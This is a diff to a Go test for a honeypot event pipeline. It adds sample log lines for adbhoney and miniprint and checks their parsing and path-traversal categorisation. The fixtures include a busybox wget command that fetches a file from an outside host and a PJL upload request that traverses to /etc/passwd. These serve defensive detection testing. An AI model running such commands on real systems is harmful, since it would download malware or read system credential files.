@@ -8,6 +8,7 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"slices"
 	"strings"
 	"testing"
 
@@ -49,7 +50,7 @@ func TestVectorRemapLive(t *testing.T) {
 	cfg.QPotID = "qp_vectorvectorvectorvecto"
 	for _, n := range []string{"cowrie", "endlessh", "dionaea", "conpot", "heralding", "adbhoney",
 		"tanner", "dicompot", "ddospot", "hellpot", "log4pot", "citrixhoneypot", "galah", "mailoney",
-		"redishoneypot", "go-pot", "beelzebub", "ciscoasa", "sentrypeer", "wordpot", "medpot", "refrigeration"} {
+		"redishoneypot", "go-pot", "beelzebub", "ciscoasa", "sentrypeer", "wordpot", "medpot", "refrigeration", "miniprint"} {
 		hp := cfg.Honeypots[n]
 		hp.Enabled = true
 		cfg.Honeypots[n] = hp
@@ -181,6 +182,12 @@ func TestVectorRemapLive(t *testing.T) {
 		"/data/honeypots/refrigeration/logs/events.json\t" + `{"event_type":"refrigeration.malformed","src_ip":"203.0.113.85","src_port":42003,"protocol":"http","action":"http.method","method":"POST","path":"/unknown","success":false,"request":"/unknown?probe=1","metadata":{"request_uri":"/unknown?probe=1","query":"probe=1","user_agent":"method-probe","reason":"method"}}`,
 		"/data/honeypots/refrigeration/logs/events.json\t" + `{"event_type":"refrigeration.read","src_ip":"203.0.113.86","src_port":42004,"protocol":"http","action":"not_found","method":"GET","path":"/unknown","request":"/unknown?archive=` + nativeArchivePassword + `","metadata":{"request_uri":"/unknown?archive=` + nativeArchivePassword + `","query":"archive=` + nativeArchivePassword + `"}}`,
 		"/data/honeypots/refrigeration/logs/events.json\t" + `{"event_type":"refrigeration.overload","src_ip":"203.0.113.87","src_port":42005,"protocol":"http","action":"http","method":"GET","path":"/metadata.json","success":false,"request":"/metadata.json","metadata":{"reason":"busy"}}`,
+		// adbhoney names its port only on session.connect; a command line has none.
+		"/data/honeypots/adbhoney/logs/adbhoney.json\t" + `{"eventid":"adbhoney.command.input","input":"cd /data/local/tmp; busybox wget http://198.51.100.9/m -O m","src_ip":"203.0.113.88","timestamp":"2026-11-08T14:27:19.864039Z","unixtime":1794148039,"session":"38ab10fcac37","sensor":"honeypot01"}`,
+		// miniprint (T-Pot 24.04.2): the request line is payload_preview, a
+		// rejected path virtual_path; "command" is only the PJL keyword.
+		"/data/honeypots/miniprint/logs/miniprint.json\t" + `{"timestamp":"2026-11-08T14:28:01.384972Z","info":"PJL command received","persona":"hp","session_id":"9aacbd8a","src_ip":"203.0.113.89","src_port":42873,"dest_ip":"172.20.0.5","dest_port":9100,"protocol":"pjl","action":"request","event":"command_received","command":"FSUPLOAD","payload_sha256":"038533bb","payload_preview":"@PJL FSUPLOAD NAME=\"0:/../../etc/passwd\" OFFSET=0 SIZE=4096\\r\\n"}`,
+		"/data/honeypots/miniprint/logs/miniprint.json\t" + `{"timestamp":"2026-11-08T14:28:01.385216Z","info":"Rejected virtual filesystem path traversal","persona":"hp","session_id":"9aacbd8a","src_ip":"203.0.113.89","src_port":42873,"dest_ip":"172.20.0.5","dest_port":9100,"protocol":"pjl","action":"reject","event":"path_traversal","virtual_path":"/../../etc/passwd"}`,
 	}, "\n") + "\n"
 
 	cmd := exec.Command(run[0], append(run[1:], "--quiet", "--config", cfgPath)...)
@@ -227,8 +234,27 @@ func TestVectorRemapLive(t *testing.T) {
 	// and the lines without an attacker address (dicompot's finished line,
 	// hellpot's/log4pot's startup lines, wordpot's profile state) must be
 	// dropped.
-	if len(rows) != 54 {
-		t.Fatalf("got %d events, want 54: %+v", len(rows), rows)
+	if len(rows) != 57 {
+		t.Fatalf("got %d events, want 57: %+v", len(rows), rows)
+	}
+	// miniprint: the operator sees what was asked for, and the categories
+	// read it (with only the PJL keyword they never matched).
+	if r := rows[55]; r.EventType != "miniprint.command_received" || r.Command != "FSUPLOAD" ||
+		!strings.HasPrefix(r.Payload, `@PJL FSUPLOAD NAME="0:/../../etc/passwd"`) || r.DestPort != 9100 {
+		t.Errorf("miniprint request row: %+v", r)
+	}
+	if r := rows[56]; r.EventType != "miniprint.path_traversal" || r.Payload != "/../../etc/passwd" {
+		t.Errorf("miniprint path traversal row: %+v", r)
+	}
+	for _, r := range rows[55:57] {
+		ev := &database.Event{Honeypot: r.Honeypot, EventType: r.EventType, Command: r.Command, Payload: []byte(r.Payload)}
+		if got := intelligence.Categorize(ev); !slices.Contains(got, intelligence.CatPathTraversal) {
+			t.Errorf("%s: categories %v, want %s", r.EventType, got, intelligence.CatPathTraversal)
+		}
+	}
+	// Its only port: the attack map shows the command as ADB, not OTHER / N/A.
+	if r := rows[54]; r.EventType != "adbhoney.command.input" || r.DestPort != 5555 || r.SourceIP != "203.0.113.88" {
+		t.Errorf("adbhoney command row: %+v", r)
 	}
 	if r := rows[48]; len(r.Username) != 256 || len(r.Payload) != 4096 || len(r.Metadata["reason"]) != 256 || len(r.Metadata["request_uri"]) != 2048 || len(r.Metadata["query"]) != 1024 || len(r.Metadata["user_agent"]) != 512 {
 		t.Errorf("native event fields escaped their size bounds: username=%d payload=%d reason=%d URI=%d query=%d user_agent=%d", len(r.Username), len(r.Payload), len(r.Metadata["reason"]), len(r.Metadata["request_uri"]), len(r.Metadata["query"]), len(r.Metadata["user_agent"]))
